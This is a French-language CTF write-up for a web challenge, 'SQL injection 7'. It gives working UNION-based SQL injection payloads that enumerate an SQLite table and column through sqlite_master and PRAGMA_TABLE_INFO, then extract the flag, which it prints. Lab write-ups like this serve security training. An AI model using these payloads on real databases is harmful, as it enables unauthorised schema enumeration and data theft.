# SQL injection 7

> web

Author: [Alexandre-Xavier Labonté-Lamoureux (AXDOOMER)](https://github.com/axdoomer)

Ce septième défi d'injection SQL indentique au défi précédent, cependant vous ne connaissez pas le nom de la table ni de la colonne!

Bonne chance!!  :-) 

## Setup

Requirements:
- BurpSuite

# Writeup

Nom de la table:
`" union select 1,2,name from sqlite_master--`

Résultat: Ja93MjakS

Nom de la colonne:
`" union select 1,2,name from PRAGMA_TABLE_INFO("Ja93MjakS")--`

Résultat: `Dab93JkA`

Requête finale: `" union select 1,2,Dab93JkA from Ja93MjakS--`

Résultat: `FLAG-7de1baec41fa6c0969290f2f2e8eddcfOkThisWasEasy`
